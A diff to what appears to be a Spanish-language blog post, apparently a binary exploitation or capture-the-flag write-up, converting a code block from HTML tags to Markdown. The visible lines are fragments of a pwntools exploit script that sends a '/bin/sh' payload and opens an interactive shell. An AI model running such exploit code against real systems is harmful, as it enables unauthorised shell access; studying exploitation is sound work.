@@ -170,7 +170,8 @@ categories: [Sin categoría]
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>from pwn import *
+```python
+from pwn import *
 from time import sleep
 
 context.clear(arch="amd64")
@@ -209,5 +210,5 @@ sleep(1)
 r.sendline(binsh)# instrucciones?
 
 r.interactive()
-</code></pre>
+```
 <!-- /wp:code -->
